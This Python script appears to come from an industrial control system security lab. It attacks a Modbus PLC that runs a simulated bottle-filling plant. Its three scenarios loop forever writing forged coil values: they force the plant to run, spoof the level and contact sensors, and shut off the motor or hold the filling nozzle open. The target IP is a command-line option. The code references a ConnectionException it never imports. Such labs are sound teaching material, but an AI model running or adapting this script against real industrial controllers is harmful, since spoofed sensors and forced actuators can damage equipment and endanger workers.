# - Logging
import  coloredlogs,logging
import argparse

from clientModbus     import ClientModbus

PLC_TAG_START = 0
PLC_TAG_LEVEL   = 1
PLC_TAG_CONTACT = 2
PLC_TAG_MOTOR   = 3
PLC_TAG_NOZZLE  = 4
PLC_TAG_RUN  = 5

def never_stop(client):
    try:
        client.connect()
        while True:
            rq = client.write(PLC_TAG_RUN, True)       # Run Plant, Run!
            rq = client.write(PLC_TAG_LEVEL, False)     # Level Sensor
            rq = client.write(PLC_TAG_CONTACT, False)   # Contact Sensor
    except KeyboardInterrupt:
            client.close()
    except ConnectionException:
        print("Unable to connect / Connection lost")

def stop_all(client):
    try:
        client.connect()
        while True:
            rq = client.write(PLC_TAG_RUN, True)       # Run Plant, Run!
            rq = client.write(PLC_TAG_LEVEL, False)     # Level Sensor
            rq = client.write(PLC_TAG_CONTACT, False)   # Contact Sensor
            rq = client.write(PLC_TAG_MOTOR, False)    # Motor
    except KeyboardInterrupt:
            client.close()
    except ConnectionException:
        print("Unable to connect / Connection lost")

def stop_and_fill(client):
    try:
        client.connect()
        while True:
            rq = client.write(PLC_TAG_RUN, True)       # Run Plant, Run!
            rq = client.write(PLC_TAG_LEVEL, False)     # Level Sensor
            rq = client.write(PLC_TAG_CONTACT, False)   # Contact Sensor
            rq = client.write(PLC_TAG_NOZZLE, True)    # Nozzle
    except KeyboardInterrupt:
            client.close()
    except ConnectionException:
        print("Unable to connect / Connection lost")

if __name__ == '__main__':
    about ="Attacks on bottles filling factory"
    parser = argparse.ArgumentParser(description=about)
    parser.add_argument("-s", "--server", dest="modbus_server", default="localhost", help="The IP of modbus server (PLC)")
    parser.add_argument("-p", "--port", dest="modbus_port", default=502, help="The port of modbus server (PLC)")
    parser.add_argument("-d", "--debug", dest="debug", action="store_true",default=False, help="debug mode")
    parser.add_argument("-c", "--scenario", dest="scenario",default=False,help="attack scenarios: never_stop, stop_all, stop_and_fill")
    options = parser.parse_args()

    coloredlogs.install()
    if options.debug:
        coloredlogs.install(level='DEBUG')

    client = ClientModbus(options.modbus_server,options.modbus_port)
    if options.scenario == 'never_stop':
        logging.info("Starting never stop attack")
        never_stop(client)
    if options.scenario == 'stop_and_fill':
        logging.info("Starting stop and fill attack")
        stop_and_fill(client)
    if options.scenario == 'stop_all':
        logging.info("Starting stop all attack")
        stop_all(client)




